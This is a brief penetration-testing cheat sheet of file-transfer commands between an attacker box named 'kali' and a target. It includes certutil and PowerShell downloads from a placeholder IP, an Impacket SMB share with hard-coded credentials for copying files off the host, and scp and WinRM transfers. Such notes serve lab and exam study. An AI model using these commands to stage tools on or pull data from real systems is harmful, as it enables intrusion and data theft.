##### SSH

```
scp file user@host:/path/to/file                        # copying a file to the remote system using scp command

scp user@host:/path/to/file /local/path/to/file         # copying a file from the remote system using scp command

scp file1 file2 user@host:/path/to/directory              # copying multiple files using scp command

scp -r /path/to/directory user@host:/path/to/directory  # Copying an entire directory with scp command
```
##### Python

```
python3 -m http.server <port>
```
##### SMB

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support -username kali -pass kali
$pass = ConvertTo-SecureString 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\<ip>\kali
cd kali:
copy <file_path> .
```
##### Windows

```
wget http://<ip>:<port>/<file>

certutil -urlcache -split -f http://<ip>:<port>/<file> <output_path>

iwr -uri http://<ip>:<port>/<file> -Outfile <output_path>
```
##### Win-RM

```
download <file_path> <host_path>
```
